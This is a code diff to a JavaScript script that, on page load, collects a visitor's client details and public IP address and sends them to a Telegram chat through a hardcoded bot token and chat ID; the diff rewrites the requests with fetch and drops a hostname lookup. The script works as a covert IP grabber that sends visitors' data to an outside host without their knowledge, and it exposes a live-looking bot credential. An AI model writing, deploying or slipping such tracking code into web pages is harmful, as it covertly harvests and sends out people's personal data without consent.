@@ -2,33 +2,10 @@ var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenB
 var chatId = '-1001690993326'; // Your "chatId" Here
 
 function getIPAddress(callback) {
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                callback(null, JSON.parse(xhr.responseText).ip);
-            } else {
-                callback('Failed to fetch IP address', null);
-            }
-        }
-    };
-    xhr.open('GET', 'https://api64.ipify.org?format=json', true);
-    xhr.send();
-}
-
-function getHostname(callback) {
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-            if (xhr.status === 200) {
-                callback(null, xhr.responseText);
-            } else {
-                callback('Failed to fetch hostname', null);
-            }
-        }
-    };
-    xhr.open('GET', 'https://api64.ipify.org/api/v1?hostname=true', true);
-    xhr.send();
+    fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => callback(null, data.ip))
+        .catch(error => callback('Failed to fetch IP address', null));
 }
 
 function getClientInfo() {
@@ -60,27 +37,17 @@ function getClientInfo() {
     getIPAddress(function (ipError, ipAddress) {
         if (ipError) {
             info += `<b>- IP Address -</b>\n<pre>Error: ${ipError}</pre>`;
-            telegramSend(info);
-            return;
+        } else {
+            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
         }
 
-        getHostname(function (hostnameError, hostname) {
-            if (hostnameError) {
-                info += `<b>- Hostname -</b>\n<pre>Error: ${hostnameError}</pre>`;
-            } else {
-                info += `<b>- Hostname -</b>\n<pre>${hostname}</pre>`;
-            }
-
-            info += `<b>- IP Address -</b>\n<pre>${ipAddress}</pre>`;
-            telegramSend(info);
-        });
+        telegramSend(info);
     });
 }
 
 function telegramSend(textData) {
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(textData) + '&parse_mode=html', true);
-    xhr.send();
+    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textData)}&parse_mode=html`)
+        .catch(error => console.error('Failed to send message to Telegram:', error));
 }
 
 getClientInfo();
